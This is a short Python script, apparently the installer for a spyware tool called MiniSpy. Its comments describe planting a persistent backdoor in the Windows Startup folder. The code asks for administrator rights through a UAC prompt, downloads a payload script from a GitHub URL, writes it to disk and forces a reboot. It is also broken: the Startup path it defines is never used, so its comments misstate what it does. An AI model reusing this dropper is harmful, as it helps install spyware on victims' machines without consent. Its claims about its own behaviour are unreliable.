# MiniSpy Installer

# Description:
# This is to install the payload to the startup files
# This will make a persistent backdoor so if they reboot the computer it will
# will start up on startup

# ------------------------------------------------------------------------------

# Import libraries
import requests  # For pulling the payload of my github repo
import ctypes, sys  # For getting ADMIN access
import os  # Reboot the computer

# Get important variables
target_path = 'C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp'  # Python does not like forward slashes
payload_url = 'https://raw.githubusercontent.com/mastermind-0010/MiniSpy/main/MiniSpy_Payload.py'


# --------------------------------------------------------------------
# IMPORTANT: This is code from
# https://stackoverflow.com/questions/130763/request-uac-elevation-from-within-a-python-script
# By: Martín De la Fuente
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()

    except:
        return False


if is_admin():
    pass

else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

# THX Martin: Very helpful =)
# --------------------------------------------------------------------

# Open the file
payload = open('MiniSpy_Payload.py', 'w+')

# Get the payload code from internet
request = requests.get(payload_url)
payload.write(request.text)

# Close the file
payload.close()

# OPTIONAL: Reboot the computer
os.system('shutdown /r /f')
